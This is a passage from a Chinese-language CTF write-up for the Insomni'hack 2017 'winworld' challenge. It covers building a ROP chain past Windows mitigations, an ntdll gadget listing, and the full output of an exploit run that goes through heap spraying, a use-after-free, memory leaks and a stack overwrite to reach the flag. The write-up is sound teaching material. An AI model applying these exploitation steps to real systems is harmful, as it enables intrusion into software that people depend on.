### 0x08 缓解措施和ROP

我们现在已经实现了任意写，并能够覆盖栈上的RIP地址。接下来，我们需要构建ROP链来实现我们的目标。以下是一些可能的ROP链构建思路：

1. **VirtualProtect**：将内存设置为可执行，然后注入shellcode。
2. **加载SMB上的库**：通过网络加载并执行恶意库。
3. **执行shell命令**：使用`WinExec`等函数执行系统命令。
4. **读取标记**：构建完整的ROP链来读取特定数据。

然而，该二进制文件启用了多种最新的[缓解措施](https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088(v=vs.85).aspx)，这些措施在我们的攻击上下文中是相关的：
- **ProcessDynamicCodePolicy**：阻止插入新的可执行内存，使`VirtualProtect`调用失败。
- **ProcessSignaturePolicy**：要求库必须签名，阻止了`LoadLibrary`的使用。
- **ProcessImageLoadPolicy**：禁止从远程位置加载库，阻止了加载SMB上的库。

尽管如此，后两个选项仍然可行。此外，我还考虑在父进程`AppJailLauncher`中添加一个使用`PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY`的`UpdateProcThreadAttribute`调用，以阻止`winworld`创建新进程。但由于`winworld`是一个控制台程序，它会启动一个`conhost.exe`进程。使用这种缓解措施会阻止`conhost.exe`的创建，从而使程序无法运行。

我的解决方案是直接通过ROP链读取数据。为了避免处理`CreateFile`和Windows句柄的复杂性，我选择了使用`ucrtbase.dll`中的`_sopen_s`、`_read`、`puts`和`_flushall`函数。

在`ntdll`中查找小配件时，我发现了一个完美的小配件，它可以按照x64调用约定弹出前四个寄存器。这个小配件在CFG中是独立的，非常适合我们的ROP链。

```assembly
0:000> u ntdll+96470 L5
ntdll!LdrpHandleInvalidUserCallTarget+0x70:
00007ffa`89b16470 5a pop rdx
00007ffa`89b16471 59 pop rcx
00007ffa`89b16472 4158 pop r8
00007ffa`89b16474 4159 pop r9
00007ffa`89b16476 c3 ret
```

### 最终整合

以下是整个利用过程的输出示例：

```plaintext
Z:aweinsomnihack2017winworld>python sploit.py getflag remote
[+] Discovering the PRNG seed...
 Clock not synced with server...
[+] Resynced clock, delay of -21 seconds
[+] Found the maze center: (38, 41)
[+] Check the map for people positions
[+] Make sure that LFH is enabled for bucket of sizeof(Person)
6 / 6 ...
[+] Spray 0x100 std::string to force future initialization of pwnrobot->is_conscious
256 / 256 ...
[+] Cloning host, with uninitialized memory this one should have is_conscious...
[+] Removing current friends of pwnrobot...
[+] Moving a guest to the maze center (37, 86) -> (38, 41)...
[+] Moving our host to the maze center (38, 29) -> (38, 41)...
[+] pwnrobot should now be a human... kill him!
[+] Removing all pwnrobot's friends...
7 / 7 ...
[+] Decrement the refcount of pwnrobot's human share_ptr to 0 -> free it
[+] Spray 0x100 std::string to trigger UAF
256 / 256 ...
[+] heap leak: 0x18a6eae8b40
[+] Leaking stack ptr...
[+] Dumping heap @ 0x18a6eae6b40...
[+] Dumping heap @ 0x18a6eae7b40...
[HEAP] 0x18a6eae7b40
 [00] - 0x18a6ea96c72
 [01] - 0x18a6ea9c550
 [02] - 0x18a6ea9e6e0
Use which qword as stack leak?
[+] Dumping heap @ 0x18a6eae8b40...
[HEAP] 0x18a6eae8b40
 [00] - 0x3ab7faf120
 [01] - 0x3ab7faf4f0
 [02] - 0x18a6ea9c550
 [03] - 0x18a6eae84c0
 [04] - 0x18a6eae8560
 [05] - 0x18a6eae8760
Use which qword as stack leak? 1
[+] stack @ 0x3ab7faf4f0
[+] Leaking stack content...
[-] Haven't found saved RIP on the stack. Increment stack pointer...
[-] Haven't found saved RIP on the stack. Increment stack pointer...
[-] Haven't found saved RIP on the stack. Increment stack pointer...
RIP at offset 0x8
[+] Overwrite stack with ROPchain...
[+] Trigger ROP chain...
Better not forget to initialize a robot's memory!Flag: INS{I pwn, therefore I am!}[+] Exploit completed.
```

### 0x09 总结

你可以在[这里](https://github.com/Insomnihack/Teaser-2017/blob/master/winworld/exploit/sploit.py)找到完整的利用代码。